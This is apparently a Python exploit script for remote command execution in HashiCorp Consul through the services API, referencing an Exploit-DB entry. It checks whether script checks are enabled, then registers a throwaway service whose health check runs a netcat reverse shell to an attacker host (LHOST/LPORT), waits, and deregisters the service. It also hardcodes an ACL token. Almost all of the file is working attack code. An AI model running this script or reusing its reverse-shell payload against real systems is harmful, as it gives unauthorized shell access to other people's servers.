#!/usr/bin/python3

"""
Hashicorp Consul - Remote Command Execution via Services API (by sha16)
Reference: https://www.exploit-db.com/exploits/46074
"""

import requests, sys
from random import choice
from string import ascii_lowercase
from time import sleep 

def check(uri, acl_token):
    response = requests.get(uri + '/v1/agent/self', headers={'X-Consul-Token':acl_token})
    if response.status_code == 200:
        if 'EnableScriptChecks' in response.text or 'EnableScriptChecks' in response.text or 'EnableRemoteScriptChecks' in response.text:
            return True

def execute_command(uri, acl_token, lhost, lport):
    service_name = ''.join(choice(ascii_lowercase) for i in range(10))     

    print("Creating service '{}'".format(service_name))

    cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f'.format(lhost, lport)
    
    data = {
        'ID':service_name,
        'Name':service_name,
        'Address':'127.0.0.1',
        'Port':80,
        'check':{
            'args':['sh','-c',cmd],
            'interval':'10s',
            'timeout':'86400s'
        }
    }

    try:
        response = requests.put(uri + '/v1/agent/service/register', headers={'X-Consul-Token':acl_token, 'Content-Type':'application/json'}, json=data)

        if response and response.status_code == 200:
            print('Service {} successfully created.'.format(service_name))
            print("Waiting for service '{}' script to trigger".format(service_name))
            sleep(12)
            print('Waiting for service {} script to trigger'.format(service_name))

            try:
                response_remove = requests.put(uri + 'v1/agent/service/deregister/' + service_name, headers={'X-Consul-Token':acl_token})    
        
                if response_remove and response_remove.status_code != 200:
                    print('[!] An error ocurred when contacting the Consul API.')

                else:
                    print("[+] Service {} was successfully removed.".format(service_name))
            except:
                pass
    except:
        pass

if __name__ == '__main__':
    rhost = '127.0.0.1'
    rport = '8500'
    lhost = 'LHOST'
    lport = 'LPORT'
    uri = 'http://' + rhost + ':' + rport
    acl_token = 'bb03b43b-1d81-d62b-24b5-39540ee469b5'

    if check(uri, acl_token):
        print('\n[+] Server vulnerable & connection successfully')
        execute_command(uri, acl_token, lhost, lport)
        sys.exit(0)
    else:
        print('[!] Connection refused.')
        sys.exit(2)
